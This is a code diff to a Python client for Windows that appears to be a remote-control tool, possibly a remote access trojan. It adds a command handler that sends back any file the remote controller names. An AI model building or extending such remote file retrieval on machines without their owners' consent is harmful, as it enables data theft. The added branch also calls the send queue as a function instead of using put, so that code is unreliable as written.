@@ -10,7 +10,7 @@ import win32con
 from tools.packet_manager import p_manager
 from tools.exception_handler import exception_handler
 from tools.dictionary import *
-from tools.utils import packet_send, packet_recv, file_recv, copy_transfer, check_key
+from tools.utils import packet_send, packet_recv, file_recv, file_send, copy_transfer, check_key
 import os
 import sys
 import random
@@ -147,7 +147,15 @@ class client:
                         return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                         return_message[PK_PAYLOAD_FLAG] = "Error receiving file. Something went wrong"
                     self.send_list.put(return_message)
-
+                elif message[PK_COMMAND_FLAG] == COMMAND_RECEIVE_FTP:
+                    try:
+                        file_send(message[PK_PAYLOAD_FLAG], self.send_list)
+                        return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+                        return_message[PK_PAYLOAD_FLAG] = "File sent"
+                    except Exception as e:
+                        return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+                        return_message[PK_PAYLOAD_FLAG] = str(e)
+                    self.send_list(return_message)
                 elif message[PK_COMMAND_FLAG] == "HLP":
                     return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
                     return_message[PK_PAYLOAD_FLAG] = """
